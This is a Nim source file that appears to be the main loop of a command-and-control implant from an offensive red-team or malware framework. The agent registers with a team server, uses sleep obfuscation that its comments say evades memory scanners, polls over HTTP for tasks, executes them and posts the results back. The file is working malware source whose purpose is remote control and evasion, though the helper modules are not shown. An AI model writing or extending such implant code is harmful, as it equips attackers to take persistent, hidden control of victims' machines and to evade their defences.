import strformat, os, times, system, base64, random

import core/[http, context, sleepmask]
import utils/io
import protocol/[task, result, heartbeat, registration]
import ../common/[types, utils, crypto]

proc main() = 
    randomize()

    # Initialize agent context
    var ctx = AgentCtx.init()
    if ctx == nil: 
        quit(0)

    # Create registration payload
    var registration: AgentRegistrationData = ctx.collectAgentMetadata()
    let registrationBytes = ctx.serializeRegistrationData(registration)

    if ctx.httpPost(registrationBytes): 
        print fmt"[+] [{ctx.agentId}] Agent registered."
        ctx.registered = true
    else: 
        print "[-] Agent registration failed."

    #[
        Agent routine: 
        1. Sleep Obfuscation
        2. Register to the team server if not already register
        3. Retrieve tasks via checkin request to a GET endpoint
        4. Execute task and post result
        5. If additional tasks have been fetched, go to 3.
        6. If no more tasks need to be executed, go to 1. 
    ]#
    while true: 

        # Sleep obfuscation to evade memory scanners
        sleepObfuscate(ctx.sleepSettings)
        
        # Register
        if not ctx.registered: 
            if ctx.httpPost(registrationBytes): 
                print fmt"[+] [{ctx.agentId}] Agent registered."
                ctx.registered = true
            else: 
                print "[-] Agent registration failed."
                continue

        let date: string = now().format(protect("dd-MM-yyyy HH:mm:ss"))
        print "\n", fmt"[*] [{date}] Checking in."

        try: 
            # Retrieve task queue for the current agent by sending a check-in/heartbeat request
            # The check-in request contains the agentId and listenerId, so the server knows which tasks to return
            var heartbeat: Heartbeat = ctx.createHeartbeat()
            let 
                heartbeatBytes: seq[byte] = ctx.serializeHeartbeat(heartbeat)
                packet: string = ctx.httpGet(heartbeatBytes)

            if packet.len <= 0: 
                print "[*] No tasks to execute."
                continue

            let tasks: seq[Task] = ctx.deserializePacket(packet)
            
            if tasks.len <= 0: 
                print "[*] No tasks to execute."
                continue

            # Execute all retrieved tasks and return their output to the server
            for task in tasks: 
                var result: TaskResult = ctx.handleTask(task)
                let resultBytes: seq[byte] = ctx.serializeTaskResult(result)

                ctx.httpPost(resultBytes)

        except CatchableError as err: 
            print "[-] ", err.msg

when isMainModule:
    main() 